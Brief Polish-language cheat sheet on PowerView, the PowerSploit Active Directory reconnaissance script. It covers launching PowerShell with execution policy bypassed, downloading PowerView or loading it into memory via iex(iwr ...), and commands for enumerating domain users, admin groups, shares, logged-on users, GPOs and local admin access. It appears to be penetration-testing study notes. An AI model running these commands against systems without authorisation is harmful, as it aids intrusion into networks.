1) Uruchomienie
      • Powershella uruchamiamy z mozliwoscia uruchamiania skryptow
            ▪ powershell -ep bypass
      • Pobranie
            ▪ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
      • Zaladowanie od razu do pamieci w powershell
            ▪ iex(iwr -Uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -UseBasicParsing)

2)Funkcje
      • Wylistowanie uzytkownikow domeny
            ▪ Get-NetUser | select cn
      • Wylistowanie uzytkownikow grupy
            ▪ Get-NetGroup -GroupName *admin*
      • Udostepnione foldery
            ▪ Invoke-ShareFinder
      • Systemy operacyjne
            ▪ Get-NetComputer -fulldata | select operatingsystem*

(Get-NetLocalGroup) - wylistowanie grup na lokalnym komputerze.
(Get-NetLocalGroupMember -Group <group>)
(Get-NetLoggedon) - wylistowanie aktualnie zalogowanych uzytkownikow na lokalnym kompie.
(Get-DomainGPO) - wymieni obiekty zasady grupy AD na kompie lokalnym
(Find-LocalAdminAccess) - sprawdza wszystkie hosty podlaczone do domeny, ktorej czescia jest aktualna maszyna i sprawdzi czy biezacy uzytkownik jest adminem lokalnym.
    https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon#powerview
    
    
    
    
    
    
    
    
    
    
    
